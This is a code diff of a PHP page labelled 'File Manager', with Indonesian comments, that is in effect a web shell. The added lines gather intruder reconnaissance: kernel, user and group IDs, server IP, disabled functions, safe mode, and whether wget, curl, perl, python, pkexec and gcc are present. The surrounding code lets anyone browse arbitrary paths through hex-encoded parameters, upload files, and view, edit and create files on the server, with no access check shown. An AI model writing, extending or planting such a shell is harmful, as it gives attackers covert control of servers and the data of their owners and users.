@@ -28,6 +28,54 @@
             <h1 class="mb-4 text-center">File Manager</h1>
         </a>
         <?php
+        $green = "<span style='color: green;'>ON</span>";
+        $red = "<span style='color: red;'>OFF</span>";
+        $sql = (extension_loaded('mysql') || function_exists('mysql_connect')) ? $green : $red;
+        $curl = (extension_loaded('curl')) ? $green : $red;
+        $wget = (is_executable('/usr/bin/wget') || is_executable('/bin/wget')) ? $green : $red;
+        $pl = (is_executable('/usr/bin/perl') || is_executable('/bin/perl')) ? $green : $red;
+        $py = (is_executable('/usr/bin/python') || is_executable('/bin/python')) ? $green : $red;
+        $pxex = (is_executable('/usr/bin/pkexec') || is_executable('/bin/pkexec')) ? $green : $red;
+        $gcc = (is_executable('/usr/bin/gcc') || is_executable('/bin/gcc')) ? $green : $red;   
+        $disfunc = @ini_get("disable_functions");
+        $kernel = php_uname();
+        $phpver = PHP_VERSION;
+        $phpos = PHP_OS;
+        $domen = $_SERVER["SERVER_NAME"];
+        $soft = $_SERVER["SERVER_SOFTWARE"];
+        $ip = gethostbyname($_SERVER['HTTP_HOST']);
+        if (empty($disfunc)) {
+            $disfc = "<gr>NONE</gr>";
+        } else {
+            $disfc = "<rd>$disfunc</rd>";
+        }
+        if (!function_exists('posix_getegid')) {
+            $user = @get_current_user();
+            $uid = @getmyuid();
+            $gid = @getmygid();
+            $group = "?";
+        } else {
+            $uid = @posix_getpwuid(posix_geteuid());
+            $gid = @posix_getgrgid(posix_getegid());
+            $user = $uid['name'];
+            $uid = $uid['uid'];
+            $group = $gid['name'];
+            $gid = $gid['gid'];
+        }        
+        $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
+        echo "
+                <div>
+                    System: <gr>$kernel</gr><br>
+                    User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
+                    PHP Version: <gr>$phpver</gr> | PHP OS: <gr>$phpos</gr><br>
+                    Software: <gr>$soft</gr><br>
+                    Domain: <gr>$domen</gr><br>
+                    Server IP: <gr>$ip</gr><br>
+                    Safe Mode: $sm<br>
+                    MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | Pkexec: $pxex | GCC: $gcc<br>
+                    Disable Function: <br><pre>$disfc</pre>
+                </div>
+        ";
         function hex($n) {
             $y = '';
             for ($i = 0; $i < strlen($n); $i++) {
@@ -35,7 +83,6 @@
             }
             return $y;
         }
-
         function unhex($y) {
             $n = '';
             for ($i = 0; $i < strlen($y) - 1; $i += 2) {
@@ -47,7 +94,6 @@
         function listDirectory($path) {
             $directories = [];
             $files = [];
-
             if (is_dir($path)) {
                 $items = array_diff(scandir($path), ['.', '..']);
                 foreach ($items as $item) {
@@ -62,10 +108,8 @@
                 echo "Path tidak valid atau bukan direktori.";
                 return false;
             }
-
             return ['directories' => $directories, 'files' => $files];
         }
-
         function formatSize($size)
         {
             if ($size >= 1073741824) {
@@ -78,7 +122,6 @@
                 return $size . ' bytes';
             }
         }
-
         $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
         if (!is_dir($path)) {
             die("Path tidak valid atau bukan direktori.");
@@ -86,7 +129,6 @@
         $path = str_replace("\\", "/", $path);
         $directoriesAndFiles = listDirectory($path);
         $paths = explode("/", $path);
-
         echo "<nav aria-label='breadcrumb'>
                 <ol class='breadcrumb bg-dark p-0'>
                     <li class='breadcrumb-item'>PATH: <a href='?path=" . hex('/') . "'>Root</a></li>";
@@ -96,9 +138,7 @@
             }
         }
         echo "</ol></nav>";
-
         echo "<div class='row'>";
-
         // Menampilkan header keterangan
         echo "<div class='container mt-4'>
                 <form method='post' enctype='multipart/form-data' class='bg-dark p-3 rounded'>
@@ -106,7 +146,6 @@
                     <button type='submit' name='upload' class='btn btn-success w-100'>Upload</button>
                 </form>
               </div>";
-
         if (isset($_POST['upload'])) {
             if (isset($_FILES['fileToUpload'])) {
                 $uploadFile = $path . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
@@ -117,7 +156,6 @@
                 }
             }
         }
-
         // Menampilkan header untuk file/folder
         echo "<div class='mb-4'>
                 <h4>List Direktori dan File</h4>
@@ -134,15 +172,12 @@
                             </tr>
                         </thead>
                         <tbody>";
-
         // Menampilkan daftar direktori terlebih dahulu
         foreach ($directoriesAndFiles['directories'] as $item) {
             $itemPath = $path . DIRECTORY_SEPARATOR . $item;
-
             $icon = '<a href="?path=' . hex($itemPath) . '" class="text-decoration-none text-white"><i class="fas fa-folder"></i></a>';
             $sizeLabel = '-';
             $nameLink = '<a href="?path=' . hex($itemPath) . '" class="text-decoration-none text-white">' . $item . '</a>';
-
             echo "<tr>
                     <td>$icon $nameLink</td>
                     <td>$sizeLabel</td>
@@ -167,15 +202,12 @@
                     </td>
                   </tr>";
         }
-
         // Menampilkan daftar file setelah direktori
         foreach ($directoriesAndFiles['files'] as $item) {
             $itemPath = $path . DIRECTORY_SEPARATOR . $item;
-
             $icon = '<a href="?view=' . hex($itemPath) . '" class="text-decoration-none text-white"><i class="fas fa-file-alt"></i></a>';
             $sizeLabel = formatSize(filesize($itemPath));
             $nameLink = '<a href="?view=' . hex($itemPath) . '" class="text-decoration-none text-white">' . $item . '</a>';
-
             echo "<tr>
                     <td>$icon $nameLink</td>
                     <td>$sizeLabel</td>
@@ -203,7 +235,6 @@
                     </td>
                   </tr>";
         }
-
         echo "</tbody></table></div></div>";
         // Menghandle view file
         if (isset($_GET['view'])) {
@@ -231,7 +262,6 @@
                     }
                 }
                 $content = file_get_contents($file);
-        
                 echo "<div class='mt-4'>
                         <h3>Edit File: " . basename($file) . "</h3>
                         <form method='post'>
@@ -455,7 +485,6 @@
                 <button type="submit" name="createFile" class="btn btn-primary mt-2">Create File</button>
             </form>
         </div>
-
         <!-- Form for creating a folder -->
         <div class="mt-4">
             <h3>Create a New Folder</h3>
